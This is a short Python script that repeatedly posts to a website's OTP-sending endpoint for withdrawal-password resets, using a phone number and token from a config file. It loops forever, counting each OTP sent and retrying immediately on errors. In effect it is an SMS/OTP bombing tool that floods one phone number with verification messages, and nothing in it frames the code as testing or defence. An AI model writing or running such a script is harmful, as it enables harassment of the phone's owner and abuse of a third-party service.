import time
import requests
import config

def send_request():
    global config
    url = "https://88panel.com/withdraw-password-send-otp/2231047/v1Ddkae9Oq4EPm8Zc1f88ba7abf09d36a49e236c3223a1d2"
    data = {"mobile": config.MOBILE_NUMBER, "_token": config.TOKEN, "name":config.MOBILE_NUMBER, "username":config.MOBILE_NUMBER,"country_code":"+91"}
    response = requests.post(url,data=data)
    if response.status_code == 200:
        config.NO_OTP += 1
        print(config.NO_OTP, "OTP sent with status code:", response.status_code, "to ",config.MOBILE_NUMBER,response.text )
    else:
        print("Error Occurred...!!!:", response.status_code,response.text)
        send_request()

send_request()

while True:
    time.sleep(config.TIME_S)
    send_request()


#url: "https://88panel.com/withdraw-password-send-otp/2231047/",config.TOKEN
